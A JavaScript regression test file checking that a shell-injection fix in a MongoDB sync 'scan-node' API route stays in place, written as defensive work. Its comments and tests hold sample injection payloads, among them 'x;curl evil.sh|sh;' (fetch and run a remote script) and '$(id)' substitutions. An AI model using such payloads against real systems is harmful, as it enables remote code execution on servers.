// ── Regression test: shell injection via /api/mongo-sync/scan-node ──────────
//
// The `verify` action parsed a host out of a user-supplied `mongoUri` with
// /\/\/([^:/]+):(\d+)/ and interpolated it into a shell script executed over
// SSH as a bare assignment:
//
//     HOST=${host || '127.0.0.1'}
//
// `[^:/]+` permits ';', '$()', backticks and spaces, so a mongoUri like
//     mongodb://x;curl evil.sh|sh;:27017
// produced `HOST=x;curl evil.sh|sh;` and ran on the SSH target.
//
// The fix is two-layered:
//   1. The host charset is restricted and the port range is validated.
//   2. Both values are quoted before entering the script.
//
// These tests assert both layers stay in place.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { shellQuote, shellInt } from '../src/utils/shellQuote.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const routePath = path.join(here, '../src/app/api/mongo-sync/scan-node/route.js');
const source = fs.readFileSync(routePath, 'utf8');

// Exact source fragments the fix depends on. Substring checks are used rather
// than regexes-on-source because the route body is full of shell metacharacters
// that make equivalent regexes hard to read and easy to get subtly wrong.
const RESTRICTED_HOST_PATTERN = 'match(/\\/\\/([a-zA-Z0-9._-]+):(\\d+)/)';
const QUOTED_PORT = "PORT=${shellInt(port) ?? '0'}";
const QUOTED_HOST = "HOST=${shellQuote(host || '127.0.0.1')}";

test('scan-node: host charset is restricted (no shell metacharacters)', () => {
  // The vulnerable pattern allowed anything except ':' and '/', which let
  // ';', '$()', backticks and spaces reach the remote shell.
  assert.equal(
    source.includes('[^:/]+'),
    false,
    'the permissive host character class must not come back'
  );
  assert.ok(
    source.includes(RESTRICTED_HOST_PATTERN),
    'verify action must parse the host with the restricted character class'
  );
});

test('scan-node: port is range-validated', () => {
  assert.ok(source.includes('port < 1 || port > 65535'));
});

test('scan-node: script interpolations are quoted, never bare', () => {
  assert.ok(source.includes(QUOTED_PORT), 'PORT must be assigned via shellInt');
  assert.ok(source.includes(QUOTED_HOST), 'HOST must be assigned via shellQuote');
  // No leftover bare assignment for either variable.
  assert.equal(
    /^\s*PORT=\$\{port\}\s*$/m.test(source),
    false,
    'bare PORT=${port} interpolation must not return'
  );
  assert.equal(
    /^\s*HOST=\$\{host \|\|/m.test(source),
    false,
    'bare HOST=${host} interpolation must not return'
  );
});

test('shellQuote neutralises a command-separator payload', () => {
  const payload = 'x;curl evil.sh|sh;';
  const quoted = shellQuote(payload);
  assert.equal(quoted, "'x;curl evil.sh|sh;'");
  // Nothing may escape the single-quoted context.
  assert.equal(quoted.startsWith("'"), true);
  assert.equal(quoted.endsWith("'"), true);
  assert.equal(/(^|[^\\])'/.test(quoted.slice(1, -1)), false);
});

test('shellQuote neutralises command substitution and backticks', () => {
  for (const payload of ['$(id)', '`id`', '${IFS}id', "a'b"]) {
    const quoted = shellQuote(payload);
    // Re-parsing the quoted token must yield the literal payload.
    assert.equal(quoted.startsWith("'") && quoted.endsWith("'"), true);
    assert.equal(quoted.slice(1, -1).replace(/'\\''/g, "'"), payload);
  }
});

test('shellInt rejects non-integer and negative values', () => {
  assert.equal(shellInt('27017'), '27017');
  assert.equal(shellInt('0'), '0');
  assert.equal(shellInt('abc'), null);
  assert.equal(shellInt('-1'), null);
});

test('legitimate hostnames still match the restricted pattern', () => {
  const re = /\/\/([a-zA-Z0-9._-]+):(\d+)/;
  for (const host of ['127.0.0.1', '10.0.0.5', 'db-01.example.com', 'my_host.local']) {
    const m = ('mongodb://' + host + ':27017').match(re);
    assert.ok(m, 'expected ' + host + ' to be accepted');
    assert.equal(m[1], host);
  }
});

test('malicious hosts are rejected by the restricted pattern', () => {
  const re = /\/\/([a-zA-Z0-9._-]+):(\d+)/;
  for (const host of ['x;curl evil.sh|sh;', '$(id)', 'a`id`b', 'a b']) {
    assert.equal(
      ('mongodb://' + host + ':27017').match(re),
      null,
      'expected ' + host + ' to be rejected'
    );
  }
});
